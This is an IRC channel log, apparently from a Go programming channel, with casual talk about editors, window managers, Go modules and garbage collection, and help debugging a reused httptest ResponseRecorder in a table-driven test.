[10:36:59] *** Joins: Vukan (~drazen@62.240.24.136)
[10:37:05] <src> would love something more lightweight running truly natively (not based on electron and web crap)
[10:37:17] *** Joins: jcajka (~jcajka@2001:1ae9:1052:8400:f9b4:e1a9:7b3a:4b77)
[10:37:18] <src> but yes, vscode seems to be the best solution and performance is not an issue at all tbh
[10:38:04] <src> whether something starts up in 1/10th of a second or 2 seconds is not an issue for an IDE, and once it's open it's fast so
[10:39:37] <endigma> vscode opens basically instantly
[10:39:46] <endigma> and uses less ram than a savvy emacs user's emacs
[10:40:21] <src> which are totally faulty benchmark values anyways
[10:40:23] <endigma> if you get over the negativity puke associated with <webapps, electron, etc> it's more than competent
[10:40:49] <endigma> stuff like the jetbrains ides will usually have some comfy tools for language specific stuff
[10:41:04] <endigma> but if you jump around or want a single program to open basically any source file on the internet
[10:41:10] <endigma> vscode is hard to beat
[10:41:12] <src> I don't like the thought of having something so specific
[10:41:26] <src> yes it certainly seems that way
[10:41:30] <endigma> i open up a vagrantfile, format i've never seen before
[10:41:35] <endigma> vscode has a built in highlighter
[10:41:40] <endigma> and knows its ruby
[10:41:47] <endigma> literally just-works:tm:
[10:42:13] <endigma> and go is unique in that you don't need 21gb of IDE to support it
[10:42:18] <src> people with heavily customized vim / emacs setups have tons of plugins etc, so basically it's a lightweight IDE, and they underestimate the time they spend configuring their stuff
[10:42:40] <src> and give them a file they've never worked with etc and they need an hour to change their config and install plugins etc :P
[10:43:07] <endigma> vscode it's like "there are extensions for .go files"
[10:43:16] <endigma> u press "OK" and within 4 seconds u have intellisense
[10:43:43] <endigma> i respect emacs and neovim hardcore users
[10:43:57] <src> sometimes I almost envy them
[10:43:59] <endigma> but its not maintainable if your job is to actually write code and not fuck with nerdfonts
[10:44:03] <src> but I don't have the patience I guess :D
[10:44:15] <bsandro> i respectfully concur
[10:44:23] <endigma> customization is the bane of productivity
[10:44:36] <bsandro> that I agree with
[10:44:46] <endigma> i spent like 3 days porting my github ci stuff to drone ci's jsonnet a while ago
[10:44:57] <endigma> literally 0 overall benefit except slightly cleaner matrix builds
[10:45:07] <endigma> there are so many rabbit holes of customization
[10:45:11] <bsandro> bailed to generic nano from neovim, 'customization' is usually adding 4 lines in config
[10:45:18] <endigma> you should try micro
[10:45:35] <endigma> it's like vscode just works level but for terminal
[10:45:46] <endigma> with notably less features than vscode though, i mean it's hands off
[10:45:58] <endigma> like micro <file> and it tends to work to some degree
[10:46:03] <bsandro> i like simple things though, that's why go feels fine for me
[10:46:10] <endigma> usually a syntax highlighter at minimum
[10:46:32] <endigma> go is great for a lot of things
[10:46:42] <endigma> i'm hoping zig pans out so I can stop using C
[10:47:28] <endigma> the only problem with go is that one binary compiles to be larger than all of alpine usually
[10:47:40] <endigma> kills IoT potential
[10:47:55] <bsandro> well, it is not iot material imo by design
[10:48:09] <endigma> Go is meant to be general purpose, that it is
[10:48:18] <bsandro> the two things i dislike about go is its modules system
[10:48:22] <bsandro> and I guess GC
[10:48:32] <endigma> I've never had an issue with either of those things
[10:48:37] <xy> heh, i actually love the modules system
[10:48:42] <endigma> modules are great
[10:48:52] <endigma> especially with the new 1.16 go install thing
[10:48:57] <bsandro> modules are cool and all but they're bound to 1 directory
[10:49:05] <endigma> wym
[10:49:27] <b0nn> hrm, isn't tinyGo aimed at IoT
[10:49:35] *** Quits: andlabs (~andlabs@68.237.68.71) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[10:49:41] <bsandro> go get/install puts them into a predefined environment directory
[10:50:00] <rudi_s> GC is great too. Makes development so much easier.
[10:50:13] <endigma> you mean gopath?
[10:50:21] <bsandro> eh in my experience you either fighting memleaks or you're fighting GC quirks
[10:50:24] <bsandro> endigma: yeah
[10:50:28] <endigma> i mean every package manager has one of those
[10:50:56] <bsandro> go mod vendor helps to an extent though
[10:50:59] <endigma> if you want it elsewhere you can package go code for whatever distro
[10:52:21] <rudi_s> bsandro: Depends on the exact scenario of course. But I had much more "fun" with memory (corruption) issues in C and the like than with GC.
[10:52:33] <endigma> I'm in a great spot rn though
[10:52:43] <endigma> writing almost completely stateless network software
[10:52:54] <endigma> who needs GC
[10:53:01] <endigma> just don't store anything ever
[10:53:17] <bsandro> rudi_s: yeah ofc it varies from case to case, not arguing :D matter of habits and particular ase
[10:53:28] *** Quits: src (~src@user/src) (Quit: leaving)
[10:54:34] <rudi_s> endigma: ;-)
[10:54:41] <bsandro> 95% of my codebase is c++ legacy anyway orz
[10:56:41] <mrig> Ah thats a shame guru seems to be broken.
[10:58:06] <mrig> I thought that was a really nice idea, it is great to have command line tooling.
[10:59:33] *** Joins: dmathieu (~textual@pop.92-184-110-147.mobile.abo.orange.fr)
[11:00:27] *** Joins: hikhvar (~thelounge@x4dbe3cf5.dyn.telefonica.de)
[11:01:20] <mrig> oh the latest version is recent, should still work, perhaps it needs the go path enabling?
[11:03:15] *** Joins: andlabs (~andlabs@68.237.68.71)
[11:04:29] <mrig> oh I use vim, no way that is changing unless xserver dies a death and replaced with something a little different.
[11:04:46] <mrig> oh was scrolled back some way there )
[11:04:55] <xy> what does vim have to do with x?
[11:05:18] *** Joins: fef (~thedawn@user/thedawn)
[11:06:55] *** Joins: mmfood_ (~mmfood@45.135.187.117)
[11:07:29] *** Joins: koo6 (~koo6@89-24-13-235.customers.tmcz.cz)
[11:07:42] *** Joins: absc (~absc@dynamic-adsl-94-34-175-4.clienti.tiscali.it)
[11:08:20] *** Quits: mmfood (~mmfood@45.135.187.117) (Ping timeout: 272 seconds)
[11:08:38] <mrig> Oh not vim, the interface with browsers and access to the keyboard.
[11:08:47] <mrig> for electron
[11:09:31] <endigma> do you have issues with that?
[11:09:39] <mrig> either electron or xserver would need to allow the keybindings to override the mouse scope.
[11:09:54] <endigma> what in the world is your use case
[11:09:56] <mrig> sure yes, the mouse is way to dominant for a vim user :)
[11:10:06] <mrig> endigma: UI generally.
[11:10:10] <endigma> have you thought of like
[11:10:17] <endigma> dwm/i3/bspwm/berry/etc
[11:10:23] <endigma> and the vim extension
[11:10:34] <mrig> sure yes I've used wm a little.
[11:11:10] <b0nn> I like my editors inside terminals - because heavy use of tmux/screen
[11:11:18] <mrig> Oh I was responding to a post that was a few buffers up :)
[11:11:32] <mrig> I like terminals to.
[11:12:08] <b0nn> I have precisely 3 applications open (but multiple instances of each) that have their own windows, terminals, browsers, and skype (sometimes I open others like Libre Office or Evince) but they live for a short time
[11:13:15] <mrig> Its a shame in a way that the browser is not more application and user scoped, seems to overflow into the programming space, the dependence upon a specific set of UI settings.
[11:13:47] <mrig> but it just has a 'shop window' feel to it, for my tastes any how :)
[11:15:25] <b0nn> What really pushed me to my 'style' was phones - I got *sick* of installing hundreds of apps and having to scroll through them all to access some stuff
[11:15:50] <endigma> i just stopped using windows and became a hardcore bspwm shill
[11:15:55] <endigma> minimizing windows == clutter
[11:16:01] <mrig> I should have another look at using a different wm, it has been a while.
[11:16:10] <b0nn> So gave up and went "Browsers + SSH client"
[11:16:32] * b0nn hasn't tried bspwm - I'm a i3wm 
[11:16:41] <endigma> i3 is comfy i hear
[11:16:53] <mrig> not come across bspwm, have tried i3wm too.
[11:16:55] <endigma> bspwm is very clean
[11:16:58] <endigma> compared to i3
[11:17:07] <endigma> but not as much pure functionality
[11:17:11] <endigma> no tabs mainly
[11:19:24] <b0nn> I have 5 workspaces - 1 for this terminal which has all my comms stuff (mutt, irc, etc), 1 for entertainment (Netflix), 1 for browsing twitter/fb/stuff, 1 for work (browser + terminal with vim mostly, and a skype pane
[11:19:53] <endigma> how do you use mutt, irc, terminal and vim
[11:20:03] <endigma> then just throw skype in there like the third wheel on a date
[11:20:10] <b0nn> I find keeping things segmented helps me remind myself when I am procrastinating/dawdling
[11:20:34] <b0nn> Skype is for family that can barely understand computers
[11:20:42] <endigma> you should try working at a startup
[11:20:49] <b0nn> ?
[11:20:54] <endigma> i procrastinate writing code and end up overhauling their devops process
[11:21:21] <endigma> everyone is forced to wear like 40 hats
[11:21:25] <b0nn> yeah, I like wearing multiple hats, but I get sick of the "crunch"
[11:21:44] <b0nn> like - oh we never told anyone that there's a deadline for yesterday
[11:22:03] <endigma> i like wearing as many hats as i can as long as none of them read "JavaScript", "C++" or "Windows Compatability"
[11:23:21] *** Joins: shka (~herr@109.231.62.239)
[11:23:52] <mrig> oh I like the bspwn documentation style.
[11:24:18] <endigma> a single manpage?
[11:25:18] <mrig> "A desktop is just a pointer to a tree."
[11:25:36] <endigma> dude is sorta theory heavy in his readme
[11:25:47] <endigma> in practice almost none of the theory matters
[11:25:53] <endigma> you can just sorta mash keys until it works
[11:26:12] <mrig> It not theory, it is describing exactly what is there.
[11:26:26] <mrig> nice an logical :)
[11:26:37] <endigma> sure if you prefer to understand it that way
[11:26:56] <endigma> "workspace" and "window" are about as useful as "tree" and "node" to the button mashing user
[11:27:06] <tree> I am useful
[11:27:10] <tree> :(
[11:27:13] <bsandro> <3
[11:27:15] <endigma> why do people take usernames like that
[11:27:21] <endigma> thing must have a fun time
[11:28:07] <tree> If you’re not being pinged at 1am about some binary tree question, you’re not livin’
[11:28:34] *** b0nn is now known as logn
[11:28:45] <logn> ahhh
[11:28:48] <mrig> hello tree, sorry for the ping, you will notice perhaps that I like to talk about trees :)
[11:28:49] <endigma> the real way to live is to be pinged at 5 am about a passing comment you made in #networking 10 hours ago
[11:29:02] *** logn is now known as b0nn
[11:29:15] *** b0nn is now known as log
[11:29:23] *** log is now known as b0nn
[11:29:36] * b0nn wakes up at 5am
[11:29:36] <tree> mrig: don’t worry, makes me feel super popular
[11:29:57] <tree> I feel like one of those fancy instagrammers
[11:30:03] <endigma> where someone feels it necessary to describe to you in excruciating detail why someone in your exact situation should abandon their entire current networking setup and switch to using Ubiquiti:tm: Unifi:tm: networking for sissies:tm: hardware
[11:31:13] * mrig hugs tree. <- I'm a veritable tree hugger me.
[11:32:05] <b0nn> endigma: <ctrl-shift-u>2122™
[11:32:18] <b0nn> (assuming linux)
[11:32:35] <endigma> what
[11:32:49] <endigma> oh for the tm symbol
[11:32:51] <b0nn> :tm:™
[11:32:53] <b0nn> ya
[11:33:00] <endigma> huh
[11:33:02] <endigma> no fuckin way
[11:33:05] <endigma> how did i not know what
[11:33:09] <endigma> does that work everywhere?
[11:33:26] <b0nn> 2122 is the unicode value for the symbol
[11:33:27] <endigma> notably not in telegram
[11:33:37] <b0nn> accessing how to input that is OS dependant I think
[11:33:53] <endigma> works in irc client and terminal
[11:33:56] <endigma> qt sucks i guess
[11:34:21] <b0nn> I had to set my screen to -U for Unicode input
[11:34:36] <b0nn> so, I guess it's app dependant not OS :)
[11:34:38] *** Quits: dmathieu (~textual@pop.92-184-110-147.mobile.abo.orange.fr) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[11:34:48] <endigma> works in xfce4-term ootb
[11:35:00] <b0nn> I use it on twitter and FB a lot
[11:35:41] <endigma> the tm symbol or unicode in general
[11:36:10] <endigma> even works in vscode
[11:36:19] <endigma> good job telegram-desktop being the worst app i use
[11:36:47] <b0nn> the tm symbol mostly - because memorised
[11:37:22] <b0nn> But if I am doing stuff - like a blog post - I will look up the unicode number for a lot of things
[11:38:57] <bsandro> U+262D the only unicode that matters
[11:39:06] <endigma> ☭
[11:39:22] <endigma> oh wait um
[11:39:28] <endigma> you're gonna hate this
[11:39:40] <endigma> ㅤ
[11:40:11] <endigma> wait no um
[11:40:32] <endigma> ඞ
[11:40:34] <endigma> this one
[11:41:30] <endigma> this is remarkably on-topic
[11:41:53] <bsandro> my bitmap font doesn't know that symbol, had to copypaste and search :D
[11:42:09] <endigma> were you disappointed?
[11:42:33] <bsandro> yes, in myself for knowing that meme :D
[11:45:52] *** Quits: hikhvar (~thelounge@x4dbe3cf5.dyn.telefonica.de) (Read error: Connection reset by peer)
[11:46:20] *** Joins: hikhvar (~thelounge@x4dbe3cf5.dyn.telefonica.de)
[11:46:58] *** Quits: Xjs (~jannis@user/xjs) (Ping timeout: 272 seconds)
[11:47:20] * b0nn isn't hip enough to know the meme :(
[11:47:57] *** Joins: Xjs (~jannis@user/xjs)
[11:48:12] <b0nn> Oh, among us?
[11:48:23] <bsandro> yeah
[11:50:29] *** Quits: pupiw (~pupiw@2600:8801:f105:5900:896f:9c7c:6735:b7fc) (Ping timeout: 245 seconds)
[11:51:41] *** Quits: hikhvar (~thelounge@x4dbe3cf5.dyn.telefonica.de) (Ping timeout: 268 seconds)
[11:53:23] *** Joins: spudly[m] (~spudly@2001:470:69fc:105::18)
[11:54:27] *** Joins: ubh (~ubh@2001:470:69fc:105::852)
[11:54:27] *** Joins: worr (~worr@2001:470:69fc:105::78c)
[11:54:27] *** Joins: mrjumper[m] (~mr-jumper@2001:470:69fc:105::7f1)
[11:54:27] *** Joins: meain (~meain@2001:470:69fc:105::2db)
[11:54:27] *** Joins: jai (~darkapex@user/darkapex)
[11:54:27] *** Joins: archwizard (~archwizar@2001:470:69fc:105::929)
[11:54:27] *** Joins: phoenix[m] (~phoenixma@2001:470:69fc:105::f9b)
[11:54:27] *** Joins: bat[m] (~batdice-t@2001:470:69fc:105::19b8)
[11:54:27] *** Joins: kadoban (~kadoban@user/kadoban)
[11:54:39] *** Joins: welt[m] (~weltspide@2001:470:69fc:105::15e2)
[11:54:41] *** Joins: speatzle_ (~speatzles@2001:470:69fc:105::1003)
[11:56:26] *** Quits: c10l (~c10l@89.34.167.207) (Quit: The Lounge - https://thelounge.chat)
[11:56:40] *** Joins: huf_ (~huf@45.95.44.141)
[11:56:47] *** Joins: c10l (~c10l@89.34.167.207)
[11:58:06] *** Joins: theoceaniscool (~theoceani@188.127.173.202)
[11:59:41] *** Quits: c10l (~c10l@89.34.167.207) (Client Quit)
[11:59:59] <b0nn> https://lore.kernel.org/ksummit/CAHk-=wiB6FJknDC5PMfpkg4gZrbSuC3d391VyReM4Wb0+JYXXA@mail.gmail.com/
[12:01:35] *** Quits: eck0 (~Android@mobile-166-173-61-29.mycingular.net) (Ping timeout: 272 seconds)
[12:06:36] *** Quits: mosen (~mosen@159-196-125-15.9fc47d.syd.static.aussiebb.net) (Ping timeout: 272 seconds)
[12:08:56] *** Quits: hgl (hgl@67.230.181.248.16clouds.com) (Quit: Bye)
[12:12:03] *** Joins: hikhvar (~thelounge@x4dbe3cf5.dyn.telefonica.de)
[12:15:19] *** Quits: eggsampler (~ur@s.id-rsa.pub) (Quit: u r)
[12:15:30] *** Joins: eggsampler (~ur@s.id-rsa.pub)
[12:18:32] *** Quits: tg (~tg@rockylinux/infra/tg) (Quit: tg)
[12:28:13] *** Joins: hgl (hgl@67.230.181.248.16clouds.com)
[13:01:42] *** Joins: vptr (~tadas@cpe-24-162-255-196.nc.res.rr.com)
[13:06:01] *** Joins: Ohlov3895174 (~0hlov3@dyndsl-080-228-185-213.ewe-ip-backbone.de)
[13:06:20] *** Quits: vptr (~tadas@cpe-24-162-255-196.nc.res.rr.com) (Ping timeout: 252 seconds)
[13:08:26] *** Quits: andlabs (~andlabs@68.237.68.71) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[13:09:04] *** Joins: dmathieu (~textual@laubervilliers-659-1-148-137.w92-154.abo.wanadoo.fr)
[13:13:27] *** Joins: dkmueller (~dkmueller@2a01:c22:6e3e:5d00:2f3d:e86b:c2d0:fcf2)
[13:18:01] *** Joins: iliaf (~iliaf@user/iluxa)
[13:18:01] *** Joins: andlabs (~andlabs@68.237.68.71)
[13:19:53] *** Quits: iluxa (~iliaf@user/iluxa) (Ping timeout: 276 seconds)
[13:20:26] *** Quits: dkmueller (~dkmueller@2a01:c22:6e3e:5d00:2f3d:e86b:c2d0:fcf2) (Quit: WeeChat 3.1)
[13:22:14] *** holgersson is now known as schrostfutz
[13:22:28] *** Joins: dkmueller (~dkmueller@2a01:c22:6e3e:5d00:2f3d:e86b:c2d0:fcf2)
[13:22:38] *** schrostfutz is now known as holgersson
[13:26:50] *** Quits: milosz (~milosz@user/milosz) (Remote host closed the connection)
[13:30:21] *** Quits: dkmueller (~dkmueller@2a01:c22:6e3e:5d00:2f3d:e86b:c2d0:fcf2) (Ping timeout: 268 seconds)
[13:37:03] *** Quits: Progster (~blah@pool-72-80-87-95.nycmny.fios.verizon.net) (Ping timeout: 252 seconds)
[13:38:05] *** Joins: omegatron (~some@p5b056bc7.dip0.t-ipconnect.de)
[13:52:05] *** Joins: pleb66 (~pleb66@user/pleb66)
[13:54:40] *** Joins: Garb0 (~Garb0@user/garb0)
[13:55:52] *** Quits: pleb66 (~pleb66@user/pleb66) (Client Quit)
[14:01:31] *** Quits: andlabs (~andlabs@68.237.68.71) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[14:06:47] *** Quits: gpeskens[w] (~gpeskens@94-209-53-75.cable.dynamic.v4.ziggo.nl) (Read error: Connection reset by peer)
[14:07:20] *** Joins: gpeskens[w] (~gpeskens@94-209-53-75.cable.dynamic.v4.ziggo.nl)
[14:12:43] *** Quits: sono (~sono@107-209-210-210.lightspeed.sntcca.sbcglobal.net) (Quit: When You're Taught Through Feelings~♪)
[14:16:43] <thinkofher> b0nn: this is way too good
[14:16:56] <b0nn> I cannot see why the response in my test (at line 44) isn't being updated each loop
[14:16:59] <b0nn> https://play.golang.org/p/81QudOrRKb1
[14:17:08] <b0nn> Do I need to flush w each time?
[14:17:33] <thinkofher> mmmm table test pattern
[14:17:53] <thinkofher> i am doing unit tests right now and i am using same pattern
[14:18:10] <thinkofher> i am just using name string field instead of map[string]test
[14:18:21] *** Joins: milosz (~milosz@user/milosz)
[14:20:46] *** Joins: souvik (~souvik@103.200.84.241)
[14:23:49] *** Quits: souvik_ (~souvik@103.199.182.212) (Ping timeout: 245 seconds)
[14:24:34] *** Joins: tedwing (~anon@lfbn-idf3-1-1409-99.w109-221.abo.wanadoo.fr)
[14:25:17] *** Quits: sord937 (~sord937@gateway/tor-sasl/sord937) (Remote host closed the connection)
[14:25:32] *** Quits: souvik (~souvik@103.200.84.241) (Ping timeout: 264 seconds)
[14:25:37] *** Joins: sord937 (~sord937@gateway/tor-sasl/sord937)
[14:25:47] *** Joins: souvik (~souvik@103.199.182.67)
[14:31:29] <b0nn> thinkofher: If you use a name string field you rune the risk of someone not using a unique name
[14:31:50] <b0nn> using a map[string]struct{} means that the compiler will enforce unique test names
[14:32:40] <b0nn> I mean, the choice is - hope it's caught at code review time, or, have the compiler absolutely stop every time
[14:33:04] <b0nn> me, I like to get computers to do the work that they can
[14:33:15] *** Quits: Garb0 (~Garb0@user/garb0) (Ping timeout: 268 seconds)
[14:33:50] <fef> are there any tool actively developed for mobile development using golang instead of fancy flutter?
[14:35:15] *** Quits: Vukan (~drazen@62.240.24.136) (Ping timeout: 244 seconds)
[14:37:10] *** Quits: dmathieu (~textual@laubervilliers-659-1-148-137.w92-154.abo.wanadoo.fr) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[14:37:55] *** Joins: dmathieu (~textual@laubervilliers-659-1-148-137.w92-154.abo.wanadoo.fr)
[14:39:19] <sztanpet> fyne.io maybe
[14:39:45] *** Quits: imm_ (~imm_@user/imm/x-3405860) (Ping timeout: 252 seconds)
[14:40:18] *** Quits: ac5tin (~ac5tin@user/ac5tin) (Ping timeout: 252 seconds)
[14:40:35] <nevivurn`> b0nn: ResponseRecorder.Flush() doesn't actually do anything, it's just there so you can check whether your handler flushed or not.
[14:40:56] <nevivurn`> ResponseRecorders can't be reused across multiple requests.
[14:41:26] *** Joins: imm_ (~imm_@user/imm/x-3405860)
[14:41:50] *** nevivurn` is now known as nevivurn
[14:43:19] *** Joins: ac5tin (~ac5tin@user/ac5tin)
[14:43:56] <sztanpet> fef also gioui.org is perfectly usable
[14:44:03] <nevivurn> https://golang.org/src/net/http/httptest/recorder.go searching for `wroteHeader`, it's never reset.
[14:45:06] <b0nn> nevivurn: I think I have found the issue, I am expecting a 401, and my handler generates it - just the recorder masks that with the 200 from the other handler
[14:46:29] <b0nn> As can be seen in the second response here https://bpa.st/IKFQ
[14:46:30] <nevivurn> b0nn: yup, only the first writeHeader() does anything, all future calls are no-ops, and it's not possible to reset the `wroteHeader` value to return it to its initial state.
[14:47:39] *** Quits: jcajka (~jcajka@2001:1ae9:1052:8400:f9b4:e1a9:7b3a:4b77) (Ping timeout: 244 seconds)
[14:47:42] *** Quits: dmathieu (~textual@laubervilliers-659-1-148-137.w92-154.abo.wanadoo.fr) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[14:48:18] <b0nn> hmm, the only way around that is to generate a new w each iteration
[14:48:25] <nevivurn> yup
[14:49:57] <b0nn> Awesome sauce, that worked, thanks
[14:56:26] *** Quits: koo6 (~koo6@89-24-13-235.customers.tmcz.cz) (Ping timeout: 244 seconds)
[14:58:48] <fef> feel these are too risky to move to prod, but still i'll play with it.  sztanpet
[15:00:55] *** Joins: jcajka (~jcajka@89-24-144-111.customers.tmcz.cz)
[15:07:27] *** Quits: hv99 (~hv99@wireguard/tunneler/hv99) (Quit: The Lounge - https://thelounge.chat)
[15:07:34] <sztanpet> there are a few products using them at least
[15:07:41] *** Joins: hv99 (~hv99@wireguard/tunneler/hv99)
[15:07:42] *** Quits: hv99 (~hv99@wireguard/tunneler/hv99) (Client Quit)
[15:08:00] *** Joins: hv99 (~hv99@wireguard/tunneler/hv99)
[15:09:02] *** Quits: unmanbearpig (~unmanbear@45.76.95.141) (Changing host)
[15:09:02] *** Joins: unmanbearpig (~unmanbear@user/unmanbearpig)
[15:14:10] *** Quits: gpeskens[w] (~gpeskens@94-209-53-75.cable.dynamic.v4.ziggo.nl) (Read error: Connection reset by peer)
[15:15:06] *** Joins: gpeskens[w] (~gpeskens@94-209-53-75.cable.dynamic.v4.ziggo.nl)
[15:25:05] *** Quits: gpeskens[w] (~gpeskens@94-209-53-75.cable.dynamic.v4.ziggo.nl) (Read error: Connection reset by peer)
[15:26:34] *** Joins: SebastianM (~seba@user/sebastianm)
[15:28:32] *** Quits: hv99 (~hv99@wireguard/tunneler/hv99) (Quit: The Lounge - https://thelounge.chat)
[15:30:22] *** Joins: frost (~frost@59.71.241.190)
[15:31:39] *** Joins: Garb0 (~Garb0@user/garb0)
[15:33:16] *** Quits: SebastianM (~seba@user/sebastianm) (Quit: Bye)
[15:34:09] *** Joins: hv99 (~hv99@wireguard/tunneler/hv99)
[15:34:24] *** Quits: huf_ (~huf@45.95.44.141) (Remote host closed the connection)
[15:41:42] *** Quits: hikhvar (~thelounge@x4dbe3cf5.dyn.telefonica.de) (Ping timeout: 244 seconds)
[15:49:51] *** Joins: Garb00 (~Garb0@user/garb0)
[15:53:24] *** Quits: Garb0 (~Garb0@user/garb0) (Ping timeout: 265 seconds)
[15:58:15] *** Joins: HederaHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25)
[15:58:23] *** Joins: HeraHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25)
[15:58:34] *** Joins: eck0 (~Android@047-007-119-133.res.spectrum.com)
[15:58:34] *** Quits: HeraHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25) (Remote host closed the connection)
[15:58:57] *** Quits: Xjs (~jannis@user/xjs) (Quit: Good night.)
[15:59:26] *** Joins: Xjs (~jannis@user/xjs)
[16:05:22] *** Quits: slax0r (~slax0r@212.85.179.58) (Ping timeout: 272 seconds)
[16:20:51] *** Joins: yoonkn (~user@175.197.208.79)
[16:23:22] *** Joins: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com)
[16:27:41] *** Quits: Garb00 (~Garb0@user/garb0) (Quit: Garb00)
[16:29:06] *** Joins: burningserenity (~burningse@2603:9001:f01:ad99::1006)
[16:34:26] *** Quits: Xjs (~jannis@user/xjs) (Quit: Good night.)
[16:43:18] *** Joins: tg (~tg@rockylinux/infra/tg)
[16:50:15] *** Quits: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[16:51:20] *** Joins: dyslexicat (~dyslexica@ymir.whatbox.ca)
[16:51:20] *** Joins: saml (~saml@cpe-74-73-80-162.nyc.res.rr.com)
[16:51:30] *** Quits: thinkofher (uid503725@user/thinkofher) (Quit: Updating details, brb)
[16:51:39] *** Joins: thinkofher (uid503725@user/thinkofher)
[16:51:41] *** Quits: yoonkn (~user@175.197.208.79) (Read error: Connection reset by peer)
[16:52:16] *** Joins: yoonkn (~user@175.197.208.79)
[16:55:02] *** Quits: thinkofher (uid503725@user/thinkofher) (Client Quit)
[16:55:12] *** Joins: thinkofher (uid503725@user/thinkofher)
[16:56:52] *** Joins: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr)
[17:01:34] *** Joins: HeraHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25)
[17:03:28] *** Joins: vptr (~tadas@cpe-24-162-255-196.nc.res.rr.com)
[17:04:57] *** Quits: HederaHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25) (Ping timeout: 268 seconds)
[17:05:09] *** Joins: Xjs (~jannis@user/xjs)
[17:07:48] *** Joins: jolof (~jolof@user/jolof)
[17:07:59] *** Quits: vptr (~tadas@cpe-24-162-255-196.nc.res.rr.com) (Ping timeout: 245 seconds)
[17:11:13] *** Quits: dyslexicat (~dyslexica@ymir.whatbox.ca) (Ping timeout: 265 seconds)
[17:12:54] *** Joins: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com)
[17:13:46] *** Joins: vptr (~tadas@cpe-24-162-255-196.nc.res.rr.com)
[17:21:58] *** Joins: mmfood (~mmfood@45.135.187.117)
[17:25:14] *** Quits: mmfood_ (~mmfood@45.135.187.117) (Ping timeout: 244 seconds)
[17:29:21] *** Quits: elastic_dog (~elastic_d@2a01:118f:822:9c00:2132:cd52:1e4a:f46a) (Quit: elastic_dog)
[17:29:44] *** Quits: frost (~frost@59.71.241.190) (Quit: Connection closed)
[17:30:11] *** Joins: elastic_dog (~elastic_d@2a01:118f:822:9c00:2132:cd52:1e4a:f46a)
[17:30:33] *** Joins: Garb0 (~Garb0@user/garb0)
[17:30:36] *** Quits: zanshin_ (~zanshin@ip24-255-217-102.ks.ks.cox.net) (Quit: WeeChat 3.0)
[17:31:01] *** Joins: zanshin (~zanshin@user/zanshin)
[17:31:36] *** Joins: andlabs (~andlabs@68.237.68.71)
[17:37:20] *** Joins: Vukan (~drazen@62.240.24.136)
[17:37:38] *** Joins: eck0__ (~Android@mobile-166-173-63-19.mycingular.net)
[17:37:44] *** Joins: paulgrmn (~paulgrmn@user/paulgrmn)
[17:37:57] *** Quits: eck0 (~Android@047-007-119-133.res.spectrum.com) (Ping timeout: 244 seconds)
[17:42:26] *** Quits: jolof (~jolof@user/jolof) (Quit: leaving)
[17:45:57] *** Joins: betelgeuse (~john2gb@94-225-47-8.access.telenet.be)
[17:46:27] *** Quits: elastic_dog (~elastic_d@2a01:118f:822:9c00:2132:cd52:1e4a:f46a) (Quit: elastic_dog)
[17:46:42] *** Joins: Torr (~Torr@170.83.146.97)
[17:49:23] *** Joins: pleb66 (~pleb66@user/pleb66)
[17:50:25] *** Joins: elastic_dog (~elastic_d@2a01:118f:822:9c00:2132:cd52:1e4a:f46a)
[17:50:41] *** Quits: wolfdale (~wolfdale@ec2-3-1-90-26.ap-southeast-1.compute.amazonaws.com) (Quit: The Lounge - https://thelounge.chat)
[17:52:20] *** Joins: wolfdale (~wolfdale@ec2-3-1-90-26.ap-southeast-1.compute.amazonaws.com)
[17:55:43] *** Quits: pleb66 (~pleb66@user/pleb66) (Quit: WeeChat 3.1)
[17:59:26] *** Joins: dyslexicat (~dyslexica@212.253.59.190)
[18:00:53] *** Quits: Xjs (~jannis@user/xjs) (Ping timeout: 272 seconds)
[18:03:48] *** Quits: dyslexicat (~dyslexica@212.253.59.190) (Ping timeout: 252 seconds)
[18:05:15] *** Joins: farmstatejake (~farmstate@user/farmstatejake)
[18:06:19] *** Quits: HeraHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25) (Ping timeout: 245 seconds)
[18:08:36] *** Joins: parnikkapore (~parnikkap@user/parnikkapore)
[18:12:28] *** Joins: kwilczynski (sid379192@id-379192.highgate.irccloud.com)
[18:13:03] *** Quits: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[18:13:30] *** Joins: Progster (~blah@pool-72-80-87-95.nycmny.fios.verizon.net)
[18:15:03] *** Joins: emcconville (~emcconvil@c-98-222-200-8.hsd1.in.comcast.net)
[18:21:37] *** Joins: Xjs (~jannis@user/xjs)
[18:24:58] *** Quits: jespada (~jespada@90.254.242.55) (Ping timeout: 244 seconds)
[18:25:31] *** Joins: Crassus (~Crassus@user/crassus)
[18:25:37] *** Quits: Crassus (~Crassus@user/crassus) (Client Quit)
[18:26:27] *** Joins: jespada (~jespada@90.254.242.55)
[18:30:56] *** Quits: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[18:33:37] *** Joins: c10l (~c10l@89.34.167.207)
[18:34:15] *** Quits: Vukan (~drazen@62.240.24.136) (Ping timeout: 272 seconds)
[18:52:14] *** Joins: arcatech (~arcatech@user/arcatech)
[18:52:44] *** Joins: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr)
[18:59:40] *** Quits: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[19:02:07] *** Joins: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr)
[19:06:23] *** Joins: ausserz (~ausserz@n219073000163.netvigator.com)
[19:08:09] *** Joins: jannis (~jannis@user/xjs)
